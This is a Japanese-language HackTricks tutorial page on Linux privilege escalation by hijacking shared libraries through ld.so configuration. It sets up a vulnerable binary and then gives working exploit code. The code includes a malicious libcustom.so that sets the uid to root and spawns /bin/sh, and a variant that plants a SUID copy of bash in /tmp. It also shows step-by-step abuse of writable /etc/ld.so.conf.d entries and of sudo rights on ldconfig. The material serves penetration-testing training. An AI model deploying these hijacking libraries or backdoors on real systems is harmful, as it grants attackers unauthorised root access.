# ld.so privesc exploit の例

{{#include ../../banners/hacktricks-training.md}}

## 環境の準備

以下のセクションでは、環境の準備に使用するファイルのコードを確認できます。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **作成** それらのファイルを同じフォルダ内のマシンに作成します
2. **コンパイル** **ライブラリ**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` を `/usr/lib` に**コピー**し、cache を更新します: `sudo cp libcustom.so /usr/lib && sudo ldconfig`（root privs）
4. **コンパイル** **実行ファイル**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### environment を確認

_libcustom.so_ が _/usr/lib_ から**ロード**されており、binary を**実行**できることを確認します。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 便利なトリアージコマンド

実際のターゲットを攻撃する場合は、バイナリが必要とする**正確なライブラリ名**と、loaderが**現在解決している対象**を確認します：
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
いくつか役立つ注意点:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` は通常 **機能しません**。リダイレクトは現在の shell によって実行されるためです。代わりに
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` を使用してください。
- **SUID/privileged** バイナリは、**secure-execution mode** では `LD_LIBRARY_PATH`/`LD_PRELOAD` を無視しますが、`/etc/ld.so.conf` から読み込まれるディレクトリは、信頼された loader 設定の一部として扱われます。そのため、この misconfiguration は privileged プログラムに依然として影響を与える可能性があります。<sup>[[1]](#references)</sup>
- 新しい glibc バージョンでは、dynamic loader に `--list-diagnostics` も追加されています。これは、hijack が期待どおりに動作しない場合に、cache の解決や `glibc-hwcaps` サブディレクトリの選択を debug するのに便利です。<sup>[[1]](#references)</sup>

## Exploit

このシナリオでは、_ /etc/ld.so.conf/_ 内のファイルに **誰かが脆弱なエントリを作成した** と仮定します:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダーは _/home/ubuntu/lib_（書き込みアクセス権がある場所）です。\
そのパス内で次のコードを**ダウンロードしてコンパイル**します。
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
後で **root**（または別の privileged account）が脆弱な binary を実行すると予想される場合は、interactive shell を起動するのではなく、通常は **root-owned artifact** を残しておく方がよいでしょう。例:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
その後、特権実行が行われたら、`/tmp/rootbash -p` を使用できます。

**誤設定された**パス内に悪意のある libcustom library を**作成した**ので、**reboot** または root user が **`ldconfig`** を実行するのを待つ必要があります（_この binary を **sudo** として実行できる場合、または **suid bit** が設定されている場合は、自分で実行できます_）。

これが発生したら、`sharedvuln` executable が `libcustom.so` library をどこからロードしているかを**再確認**します:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
ご覧のとおり、これは **`/home/ubuntu/lib` からloading** しており、誰かが実行すると shell が実行されます:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> この例ではまだ privileges を escalation していない点に注意してください。しかし、実行されるコマンドを変更し、**root またはその他の privileged user が vulnerable binary を実行するのを待つ**ことで、privileges を escalation できます。

### その他のmisconfigurations - Same vuln

前の例では、administrator が **`/etc/ld.so.conf.d/` 内の configuration file に non-privileged folder を設定した**という misconfiguration を偽装しました。\
しかし、同じ vulnerability を引き起こす可能性のある misconfigurations は他にもあります。`/etc/ld.so.conf.d` 内の **config file**、`/etc/ld.so.conf.d` フォルダー、または `/etc/ld.so.conf` ファイルに **write permissions** がある場合、同じ vulnerability を設定して exploit できます。

## Exploit 2

**`ldconfig` に対する sudo privileges があるとします**。\
`ldconfig` **が conf files を読み込む場所を指定できる**ため、これを利用して `ldconfig` に任意のフォルダーを読み込ませることができます。<sup>[[2]](#references)</sup>\
それでは、`"/tmp"` を読み込むために必要な files と folders を作成しましょう：
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
ここで、**previous exploit**で示したように、**malicious libraryを`/tmp`内に作成**します。\
最後に、pathを読み込んで、binaryがどこからlibraryを読み込んでいるかを確認します：
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**ご覧のとおり、`ldconfig` に対する sudo 権限があれば、同じ脆弱性を exploit できます。**

## 参考資料

- [1] [ld.so(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
